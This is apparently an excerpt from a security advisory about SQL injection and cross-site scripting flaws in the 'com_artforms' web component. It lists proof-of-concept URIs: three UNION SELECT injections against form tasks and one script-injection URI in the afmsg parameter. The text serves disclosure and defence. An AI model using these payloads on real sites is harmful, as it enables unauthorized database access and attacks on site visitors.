An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

SQL-Injection:

http://www.example.comindex.php?option=com_artforms&amp;task=ferforms&amp;viewform=1 UNION SELECT 1,2,3,4,5,6%23
http://www.example.comindex.php?option=com_artforms&amp;task=vferforms&amp;id=1 UNION SELECT 1,2,3,4,5,6%23
http://www.example.comindex.php?option=com_artforms&amp;task=tferforms&amp;viewform=1 UNION SELECT 1,2,3,4,5,6%23

Cross-site Scripting:

http://www.example.comindex.php?option=com_artforms&amp;formid=1&amp;afmsg=&lt;script&gt;alert('xss');&lt;/script&gt;
